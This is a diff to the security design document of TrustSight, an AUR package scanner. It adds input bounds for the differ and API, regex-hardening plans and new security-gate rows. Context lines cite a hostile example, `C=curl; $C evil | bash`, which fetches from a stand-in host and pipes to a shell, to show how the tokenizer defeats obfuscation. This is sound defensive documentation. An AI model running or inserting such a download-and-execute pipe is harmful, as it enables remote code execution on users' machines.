@@ -194,6 +194,10 @@ Cloning executes nothing. Repositories are fetched through `pygit2` (libgit2) wi
 
 `full-aur` and `full-aur --watch` change the *volume* of this, not its shape. A watch loop makes many requests to the one host in A3 over hours or days, so the bounds above are per-request and the loop adds two of its own: a configured interval with a 60-second floor, and an optional cycle count. Each cycle is an ordinary analysis; nothing about running on a timer relaxes A1 through A13.
 
+The differ has its own local bounds inside A4: generated metadata patches are capped at `differ.MAX_GENERATED_DIFF_BYTES` when the git path requests a limit; companion files are capped at `MAX_COMPANION_BYTES` and `MAX_COMPANION_FILES`; paths and extracted URL tokens have fixed byte/count limits. Companion blobs are size-checked before their bytes are read. URL lists and file-change summaries are sorted before reporting, so repository traversal order cannot change a result. Malformed hunk headers and content outside a valid hunk are ignored rather than mapped to a fabricated location. If the pipeline's combined diff cap truncates output, `diff_truncated` remains a visible coverage gap and the result cannot read as clean.
+
+The public API applies equivalent input bounds before initialization: package and indicator names are capped at 256 UTF-8 bytes, PKGBUILD and metadata text at 5 MiB, repositories at 256 names, and package/history collections at 10,000 entries. Invalid types, booleans used as numeric limits, negative values, and oversized inputs fail with `ValueError` before database or network work.
+
 There is deliberately **no hook, callback, or notification command**: nothing in TrustSight spawns an operator-supplied program, with or without findings on stdin. That is worth stating because it is a natural thing to want from a watch loop, and a natural thing to add carelessly. If it is ever added it belongs in this part with its boundary written down, because such a hook would receive attacker-influenced JSON (package names, maintainer names, quoted evidence) and the operator's script would own what happens next. Today the only subprocesses are the `pacman`, `pacman-conf` and `vercmp` calls in A1.
 
 **A5. Matching is bounded, and the bound is recorded.** Rule patterns are regexes running over attacker-written text, so the input is clamped to `rules.MAX_RULE_LINE_BYTES` (8 KiB) per line before matching. That bounds every pattern at once, including ones added later, in a way that no per-pattern audit can.
@@ -201,6 +205,10 @@ There is deliberately **no hook, callback, or notification command**: nothing in
 The clamp applies to both rule engines. The patterns in `rules.toml` go through `apply_rules`; the larger set emitted from `analysis/` matches the diff text directly, and `rules.clamp_text` bounds that text before it gets there. That distinction is not cosmetic: while only the first was clamped, one 5 MiB line cost 0.17s through `apply_rules` and 15s through the code-emitted rules.
 
 A clamp is also a truncation seam: a payload placed past byte 8192 of a single line is not matched. A bound that silently drops content is exactly the class of skip B2 exists to prevent, so it does not stay silent. A diff containing any over-length line records the `line_truncated` coverage gap, and everything in B2 then applies: the run cannot report UNFLAGGED, and the gap is shown with the band. Lines are joined across backslash continuations before this is measured, so the limit applies to the logical line an attacker actually controls.
+
+The current runtime uses Python's standard `re` module. This is a deliberate dependency boundary: the input clamp is applied before both TOML-configured and code-emitted patterns, and the security gates exercise adversarial matching time. The project does not claim that input clamping proves every pattern is linear. The next regex hardening step is comparative: audit the shipped and configured patterns, add per-pattern adversarial cases, and benchmark the standard engine against a bounded alternative before changing the runtime dependency. A replacement such as the third-party `regex` package is not an automatic improvement; it expands the trusted dependency set and must first demonstrate lower worst-case cost, compatible syntax, deterministic behavior, and acceptable packaging and maintenance risk.
+
+At runtime, a configured rule pattern that exceeds the bounded adversarial probe budget is refused by the rule compiler and contributes no finding. This is a fail-closed safety decision for the pattern, not a claim that the rule matched cleanly. The configured rules remain subject to the rule linter, while the source and dynamic pattern families remain covered by the repository-wide audit gate. The optional comparison tool is `scripts/benchmark_regex_engines.py`; it reports that `regex` is unavailable unless the operator installs it separately, so the production dependency set does not change as part of benchmarking.
 
 **A6. Expansion is bounded and never indirect.** The tokenizer resolves shell variables so that a payload assembled from `C=curl; $C evil | bash` still reaches the rules. That makes it the second parser eating hostile input, and the one with an amplification property the regex engine does not have: `b=$a$a` doubles per level, so a chain of them grows as `2**depth`, and a 517-byte PKGBUILD was once enough to OOM the process. Four bounds apply: `_MAX_EXPANSION_PASSES` (16 rewrites, each resolving one innermost `${...}`), `_MAX_VALUE_LEN` (8 KiB for one value), `_MAX_LINE_LEN` (64 KiB for one resolved line), and `_MAX_TABLE_BYTES` (1 MiB for the variable table as a whole).
 
@@ -445,7 +453,12 @@ python scripts/security_gates.py
 | `one network host, declared` | A3 | endpoint constants: `aur.archlinux.org` everywhere, `github.com` only in `release.py` |
 | `every request has a timeout` | A4 | `urlopen` call sites |
 | `rule matching is bounded on hostile input` | A5 | `rules.MAX_RULE_LINE_BYTES` |
+| `differ hostile input is bounded` | A4 | `differ` parser limits and hostile extraction gate |
+| `differ output is deterministic` | Guarantees | sorted differ summaries and URL extraction |
+| `API inputs are bounded before initialization` | A4 | `trustsight.api` input validators |
 | `expansion is bounded and never indirect` | A6 | `tokenizer.py` |
+| `tokenizer hostile-input smoke is deterministic` | A6, A14 | `tokenizer.py` and fixed hostile-input smoke cases |
+| `regex patterns pass adversarial audit` | A5, A14 | configured and source regex patterns |
 | `report rendering is data-driven` | A7 | `verdict.py`, `findings.py` |
 | `archives are never extracted to disk` | A8 | `full_aur/fetch.py` |
 | `SQL is parameterised` | A9 | `db.py` |
@@ -480,6 +493,7 @@ python scripts/security_gates.py
 | `every result render ends with a direction to review` | B9 | `verdict.DIRECTIONS`, structural |
 | `no git filters or hooks are configured` | A3 | clone configuration |
 | `docs/security.md matches the gates` | this page | the table above |
+| `critical paths are synchronised` | `CODEOWNERS`, signature workflow and contributor policy | canonical `scripts/critical_paths.py` |
 
 A11 has no row of its own: freshness anchoring is enforced by `tests/test_fetcher.py` rather than by a gate, because the property is about which value a function reads, and is checked most directly by calling it.
 
